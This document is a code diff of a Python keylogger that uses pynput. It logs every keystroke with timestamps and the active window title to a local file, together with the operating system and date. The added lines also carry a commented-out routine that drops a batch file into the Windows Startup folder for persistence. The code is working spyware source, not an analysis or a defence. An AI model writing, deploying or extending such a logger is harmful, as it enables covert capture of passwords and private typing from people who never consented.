@@ -1,28 +1,22 @@
-import pynput
-import ctypes
-import sys
-import win32gui
 import datetime
 import platform
 
-
-from datetime import time
-from datetime import date
 from datetime import datetime
-
-
-name_last_active_window = ""
-
-
 from pynput.keyboard import Key, Listener
 
-
-import logging
-import sys
-
-#logging.basicConfig(format='%(asctime)s %(levelname)s %(message)s',
-                    #level=logging.DEBUG,
-                    #stream=sys.stdout)
+#
+# USER_NAME = getpass.getuser()
+name_last_active_window = ""
+#
+#
+# # def add_to_startup(file_path=""):
+#    # if file_path == "":
+#       # file_path = os.path.dirname(os.path.realpath(__file__))
+#     # bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+#     # with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+#         # bat_file.write(r'start "" %s' % file_path)
+#
+#
 
 
 def get_active_window():
@@ -33,72 +27,34 @@ def get_active_window():
     return active_window_name
 
 
-print("Active window: %s" % str(get_active_window()))
-
-# keys = []
+# print("Active window: %s" % str(get_active_window()))
 
 
 def on_press(key):
-    # global keys
-    # keys.append(key)
     print("{0} pressed".format(key))
-    w = get_active_window()
-    write_file(key, w)
+    write_file(key)
 
 
-def write_file(key, w):
+def write_file(key):
     global name_last_active_window
-    f = open("log.txt", "a")
-    #f.write(datetime.datetime.now().ctime())
-    #f.write("\n")
-    #f.write("Operating system: ")
-    #f.write(platform.platform())
+    f = open("log.txt", "a", encoding='utf-8')
     f.write("\n")
-    #q = get_active_window()
-    #i = 0
-    #f.close()[poiugy
-    #f.write("\n")hello
     active_window = str(get_active_window())
+
     if name_last_active_window != active_window:
         f.write("\n")
         f.write(f"Active window: {active_window}")
-        f.write("\n")
-    name_last_active_window = active_window
-
-   # with open("log.txt", "a") as f:
-
-    #for key in keys:
-
-
-            #f.write(str(i))
-
-            #f.write("\n")
-            #w = get_active_window()u8y7tutdvghj
-            #if w != q:
-                #f.write("\n")
-                #f.write("Active window: %s" % str(get_active_window()))
-                #f.write("\n")
-            #if (w != get_active_window()):hellog
-                #get_active_window()pkojihuyg
-                #f.write("Active window: %s" % str(get_active_window()))
-                #f.write("\n\n")
-    k = str(key).replace("'", "")
-    #k = str(*keys)
-
-    if k.find("space") > 0:
         now_time = datetime.now().time().replace(microsecond=0)
-        time_format = "%H:%M:%S"
+        f.write(" ")
         f.write(str(now_time))
-        f.write(' ')
-        f.write('space pressed')
-    elif k.find("Key") == -1:
-        now_time = datetime.now().time().replace(microsecond=0)
-        time_format = "%H:%M:%S"
-        if k.find(' '):
-            f.write(str(now_time))
-        # f.write(' ')
-            f.write(k)
+        f.write("\n")
 
+    name_last_active_window = active_window
+    k = str(key).replace("'", "")
+    now_time = datetime.now().time().replace(microsecond=0)
+    f.write(str(now_time))
+    f.write(' ')
+    f.write(k)
     f.close()
 
 
@@ -108,17 +64,18 @@ def on_release(key):
 
 
 def main():
-    f = open("log.txt", "w")
-    now_data = datetime.now().date()
-    f.write(str(now_data))
-    f.write("\n")
+    f = open("log.txt", "w", encoding='utf-8')
     f.write("Operating system: ")
     f.write(platform.platform())
+    f.write("\n")
+    now_data = datetime.now().date()
+    f.write(str(now_data))
 
 
 if __name__ == "__main__":
     main()
 
-
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
+
